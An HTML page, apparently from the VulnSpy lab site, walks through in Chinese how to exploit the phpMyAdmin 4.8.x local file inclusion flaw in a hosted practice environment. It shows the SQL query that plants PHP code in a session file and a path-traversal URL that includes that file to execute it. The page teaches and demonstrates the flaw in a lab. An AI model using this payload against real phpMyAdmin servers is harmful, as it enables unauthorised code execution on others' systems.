@@ -1,0 +1,173 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Ambulong">
+<meta name="description" content="ChaMd5安全团队公开了一个phpMyAdmin最新版中的本地文件包含漏洞。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。在这篇文章中我们将使用VulnSpy[在线 phpMyAdmin 环境来演示该漏洞的利用。">
+<meta name="keywords" content="pma,phpMyAdmin,文件包含,代码执行,漏洞,fli,lfi,rce,Local File Inclusion,remote code execution,vulnerability,security,security,practict,在线靶场,黑客技术,网络安全,信息安全,漏洞测试,CTF在线,渗透测试,在线练习,演练,实验,pentest,online">
+<title>phpMyAdmin 4.8.x 本地文件包含漏洞利用 | VULNSPY</title>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+<script src="/js/jquery-1.11.3.min.js"></script>
+<script src="/js/jquery-migrate-1.2.1.min.js"></script>
+<link href="/css/bootstrap.min.css" rel="stylesheet">
+<link href="/css/ie10-viewport-bug-workaround.css" rel="stylesheet">
+<!--[if lt IE 9]><script src="/js/ie8-responsive-file-warning.js"></script><![endif]-->
+<script src="/js/ie-emulation-modes-warning.js"></script>
+<!--[if lt IE 9]>
+<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script src="/js/bootstrap.min.js"></script>
+<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+<script src="/js/ie10-viewport-bug-workaround.js"></script>
+<link rel="stylesheet" href="/css/custom.css" />
+<script src="/js/functions.js"></script>
+<script src="/js/custom.js"></script>
+<script>
+function GetQueryString(name)
+{
+     var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+     var r = window.location.search.substr(1).match(reg);
+     if(r!=null)return  unescape(r[2]); return null;
+}
+var lang="en";
+var la=(navigator.language) ? navigator.language.toLowerCase() : navigator.userLanguage.toLowerCase();
+if(la=='zh-cn' || la=='zh-tw' || la=='zh-hk'){
+	lang="cn";
+}
+</script>
+<!--[if lt IE 9]>
+	<script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
+<![endif]-->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-108901411-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-108901411-2');
+</script>
+</head>
+<body>
+<div class="view-header" style="z-index: 999;">
+    <ul>
+    	<li><a href="/"><h1><img style="width:1.5em;height: auto;margin-top: -0.3em;" src="/images/owl2.png" /></h1></a></li>
+        <li><a href="/">VULNSPY</a></li>
+        <li><a href="https://blog.vulnspy.com/">BlOG</a></li>
+        <div class="pull-right">
+            <li><a target="_blank" href="https://www.reddit.com/r/jiuwu/">DISCUSS ON REDDIT</a></li>
+            <li><a target="_blank" href="https://www.youtube.com/channel/UCnqjUDkrZ0OFwZvxxiC47gw">YOUTUBE CHANNEL</a></li>
+        </div>
+    </ul>
+</div>
+<style>
+img{
+	max-width: 100%;
+}
+.lab{
+	margin: 0 auto;
+	margin-top: 7em;
+	max-width: 80em;
+	width: 95%;
+}
+.lab h1{
+	padding: 0;
+	font-size: 200%;
+	text-align: center;
+	font-weight: bold;
+}
+
+.lab .demo{
+	font-size: 115%;
+	line-height: 2em;
+	border: 1px solid #ccc;
+	background: #2C3844;
+	margin: 1.8em 0 1em 0;
+}
+.lab .demo .demo-btn{
+	text-align: center;
+	font-size: 150%;
+	margin: 0.3em 0;
+	color: #FFF;
+}
+.lab .demo .demo-btn a{
+	background: transparent;
+	padding: 1em;
+	font-size: 100%;
+	display: block;
+	
+}
+.lab .demo .demo-link{
+	background: rgba(0,0,0,.25);
+}
+.lab .demo a{
+	font-size: 50%;
+	text-transform: uppercase;
+	padding: 0 0.5em;
+	color: #FFF;
+}
+.lab .content{
+	font-size: 120%;
+	line-height: 2em;
+}
+.lab .content p{
+	margin: 1em 0;
+	text-align: justify;
+}
+</style>
+<div class="lab">
+	<h1>phpMyAdmin 4.8.x 本地文件包含漏洞利用</h1>
+	<hr/>
+	<div class="demo">
+		<div class="demo-btn">
+			<a target="_blank" href="https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1"><span class="glyphicon glyphicon-flag" aria-hidden="true"></span>&nbsp;&nbsp;START TO HACK</a>
+		</div>
+		<div class="demo-link">
+			<a href="https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1" target="_blank">https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1</a>
+			<a class="pull-right" href="https://www.vsplate.com/" target="_blank">Powered by VSPlate</a>
+		</div>
+	</div>
+	<p id="demo-notice" style="padding: 0.5em 0.5em;color:#fff;text-align:center;background:#2c3844;text-transform:uppercase;">VulnSpy provides the online environment for security testing, click '<b>START TO HACK</b>' to start the playing.</p>
+	<hr/>
+	<div class="content"><p>今天<a href="http://chamd5.org">ChaMd5安全团队</a>公开了一个phpMyAdmin最新版中的本地文件包含漏洞：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd">phpmyadmin4.8.1后台getshell</a>。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。</p>
+<p>在这篇文章中我们将使用VulnSpy的<a href="http://www.vulnspy.com/phpmyadmin-4.8.1/">在线 phpMyAdmin 环境</a>来演示该漏洞的利用。</p>
+<p>VulnSpy 在线 phpMyAdmin 环境地址：<a href="http://www.vulnspy.com/phpmyadmin-4.8.1/">http://www.vulnspy.com/phpmyadmin-4.8.1/</a></p>
+<h2>漏洞细节</h2>
+<p>参照ChaMd5安全团队发布的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd">phpmyadmin4.8.1后台getshell</a></p>
+<h2>漏洞利用</h2>
+<p><strong>因为原文中<code>包含数据库文件</code>可能由于文件权限或者帐号权限不足而无法利用，这里我们将使用另外一种方式来利用该文件包含漏洞，即包含session文件。</strong></p>
+<p><strong>1. 进入VulnSpy <a href="http://www.vulnspy.com/phpmyadmin-4.8.1/">在线 phpMyAdmin 环境地址</a>，点击 Start to Hack ，跳转到VSPlate</strong></p>
+<p><img src="/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_1.png" alt="VulnSpy" title="VulnSpy" /></p>
+<p><strong>2. 等待载入设置后，点击 GO 按钮开启实验</strong></p>
+<p><img src="/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_2.png" alt="VulnSpy" title="VulnSpy" /></p>
+<p><strong>3. 实验创建完成后，点击演示地址进入实验</strong></p>
+<p><img src="/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_3.png" alt="VulnSpy" title="VulnSpy" /></p>
+<p><strong>4. 使用帐号 root ，密码 toor 登录 phpMyAdmin</strong></p>
+<p><img src="/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_4.png" alt="VulnSpy" title="VulnSpy" /></p>
+<p><strong>5. 点击顶部导航栏中的<code>SQL</code>按钮，执行SQL查询</strong></p>
+<pre><code class="language-sql">select '&lt;?php phpinfo();exit;?&gt;'</code></pre>
+<p><img src="/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_5.png" alt="VulnSpy" title="VulnSpy" /></p>
+<p><strong>6. 获取自己的SESSION ID</strong></p>
+<p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p>
+<p><img src="/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_6.png" alt="VulnSpy" title="VulnSpy" /></p>
+<p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p>
+<p><strong>7. 包含SESSION文件，成功利用该漏洞</strong></p>
+<pre><code class="language-bash">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</code></pre>
+<p><img src="/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_7.png" alt="VulnSpy" title="VulnSpy" /></p>
+<h3 style="margin-top:1.5em;">GitHub 源码</h3>
+<p><a href="https://github.com/vulnspy/phpmyadmin-4.8.1" target="_blank">https://github.com/vulnspy/phpmyadmin-4.8.1</a></p>
+<h3 style="margin-top:1.5em;">参考</h3>
+<p style="text-align:left;">
+ <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd">【首发】phpmyadmin4.8.1后台getshell</a><br>
+phpMyAdmin 4.8.x LFI to RCE (Authorization Required) - <a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/</a><br>
+</p></div>
+</div>
+<script>
+if(lang == 'cn'){
+	$("#demo-notice").html("VulnSpy 提供了一系列在线测试环境, 点击上方的 '<b>START TO HACK</b>' 开启实验.");
+}
+</script>
+</body>
+</html>
